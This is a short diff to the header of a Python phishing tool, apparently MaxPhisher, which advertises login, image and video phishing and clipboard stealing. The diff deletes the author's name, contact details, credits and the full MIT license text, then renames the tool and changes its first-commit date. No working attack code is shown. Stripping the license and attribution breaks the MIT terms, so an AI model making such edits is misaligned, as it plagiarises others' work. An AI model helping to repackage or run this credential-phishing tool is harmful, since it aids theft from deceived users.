@@ -1,43 +1,14 @@
 # -*- coding: UTF-8 -*-
-# ToolName   : MaxPhisher
-# Author     : KasRoudra
-# License    : MIT
-# Copyright  : KasRoudra (2022-2023)
-# Github     : https://github.com/KasRoudra
-# Contact    : https://m.me/KasRoudra
-# Description: MaxPhisher is a phishing tool in python
+# ToolName   : phishing 
+# Description: phishingis a phishing tool in python
 # Tags       : Multi phishing, login phishing, image phishing, video phishing, clipboard steal
-# 1st Commit : 08/9/2022
+# 1st Commit : 03/9/2023
 # Language   : Python
 # Portable file/script
 # If you copy open source code, consider giving credit
-# Credits    : PyPhisher, VidPhisher, CamHacker, IP-Tracker, StromBreaker, Seeker
 # Env        : #!/usr/bin/env python
 
 
-"""
-MIT License
-
-Copyright (c) 2022-2023 KasRoudra
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
-"""
 
 from argparse import ArgumentParser
 from importlib import import_module as eximport
